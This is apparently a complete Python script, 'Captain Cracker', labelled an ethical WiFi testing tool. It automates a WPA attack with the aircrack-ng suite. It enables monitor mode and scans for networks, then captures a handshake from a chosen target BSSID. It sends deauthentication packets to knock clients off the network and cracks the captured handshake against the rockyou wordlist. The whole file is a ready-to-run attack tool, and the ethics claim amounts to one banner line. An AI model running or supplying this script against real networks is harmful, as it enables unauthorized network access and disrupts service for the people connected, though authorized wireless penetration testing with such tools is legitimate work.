#!/usr/bin/env python3
import subprocess
import re
import os
import time
import sys

def display_intro():
    intro_message = '''
##################################################
#                 Captain Cracker                #
#           Ethical WiFi Testing Tool            #
#              Author: Nandu10                   #
#  LinkedIn: https://linkedin.com/in/nandu-krishna-  #
##################################################
'''
    print(intro_message)
    print("Hacking is an art — use your skills ethically!\n")

def get_wifi_cards():
    print("[*] Scanning for WiFi cards...")
    result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
    cards = re.findall(r'^(\w+)\s+IEEE 802.11', result.stdout, re.M)
    return cards

def pick_card(cards):
    print("\nAvailable WiFi Cards:")
    for i, card in enumerate(cards):
        print(f"{i}: {card}")
    while True:
        try:
            choice = int(input("Choose your WiFi card: "))
            if 0 <= choice < len(cards):
                return cards[choice]
        except ValueError:
            pass
        print("Invalid selection. Try again.")

def start_monitor_mode(card):
    print(f"[*] Enabling monitor mode on {card}...")
    subprocess.run(['airmon-ng', 'start', card], stdout=subprocess.DEVNULL)
    return card + "mon"

def scan_wifi(mon_card):
    print(f"[*] Starting scan on {mon_card}. Press Ctrl+C to stop.")
    try:
        subprocess.run(['airodump-ng', mon_card])
    except KeyboardInterrupt:
        print("\n[*] Scan interrupted.")

def get_handshake(mon_card, bssid, channel):
    folder = "handshakes"
    os.makedirs(folder, exist_ok=True)
    savefile = f"{folder}/{bssid.replace(':', '-')}"
    
    print("[*] Capturing handshake...")
    proc = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', savefile, mon_card])

    time.sleep(5)
    print("[*] Sending deauth packets...")
    subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, mon_card], stdout=subprocess.DEVNULL)

    try:
        time.sleep(20)
    except KeyboardInterrupt:
        print("[*] Early stop requested.")

    proc.terminate()
    capfile = savefile + "-01.cap"
    print(f"[+] Handshake saved to {capfile}")
    return capfile

def crack_handshake(capfile):
    wordlist = input("Path to wordlist? [Default: rockyou.txt]: ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"

    if not os.path.isfile(wordlist):
        print("[-] Wordlist file not found!")
        return

    print("[*] Cracking in progress...")
    subprocess.run(['aircrack-ng', '-w', wordlist, capfile])

def main():
    if os.geteuid() != 0:
        print("[-] Run this script as root.")
        sys.exit(1)

    display_intro()
    cards = get_wifi_cards()

    if not cards:
        print("[-] No compatible WiFi cards found.")
        return

    card = pick_card(cards)
    mon_card = start_monitor_mode(card)
    scan_wifi(mon_card)

    bssid = input("Enter target BSSID: ").strip()
    channel = input("Enter channel: ").strip()

    capfile = get_handshake(mon_card, bssid, channel)
    crack_handshake(capfile)

if __name__ == "__main__":
    main()
